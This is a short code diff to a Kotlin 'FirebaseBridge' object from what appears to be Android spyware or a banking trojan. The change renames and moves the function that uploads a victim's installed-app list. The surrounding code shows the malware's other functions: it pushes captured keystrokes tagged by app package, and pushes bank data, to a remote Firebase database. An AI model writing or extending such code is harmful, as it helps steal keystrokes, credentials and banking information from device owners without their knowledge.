@@ -25,7 +25,6 @@ object FirebaseBridge {
     fun registerDevice(name: String, version: String, apps: List<String>) {
         deviceRef.child("deviceName").setValue(name)
         deviceRef.child("androidVersion").setValue(version)
-        deviceRef.child("appList").setValue(apps)
         deviceRef.child("lastSeen").setValue(ServerValue.TIMESTAMP)
     }
 
@@ -41,7 +40,9 @@ object FirebaseBridge {
         infoRef.child("keylogs").push().setValue("[$ts] $pkg: $text")
     }
 
-    fun pushAppsList(apps: List<String>) = infoRef.child("apps").setValue(apps.joinToString("\n"))
+    fun pushInstalledApps(apps: List<String>) {
+        infoRef.child("installed_apps").setValue(apps.joinToString("\n"))
+    }
 
     fun pushBankData(json: String) = bankRef.push().setValue(json)
 
